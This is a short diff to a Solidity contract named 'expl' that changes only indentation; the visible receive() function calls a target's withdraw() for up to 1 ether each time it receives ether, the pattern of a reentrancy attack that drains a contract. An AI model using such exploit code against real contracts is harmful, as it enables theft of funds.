@@ -19,7 +19,7 @@ contract expl {
 
 	receive() external payable {
 		uint amount = 1e18 <= address(target_addr).balance
-				? 1e18 : address(target_addr).balance;
+			? 1e18 : address(target_addr).balance;
 
 		if(amount > 0) {
 			target.withdraw(amount);
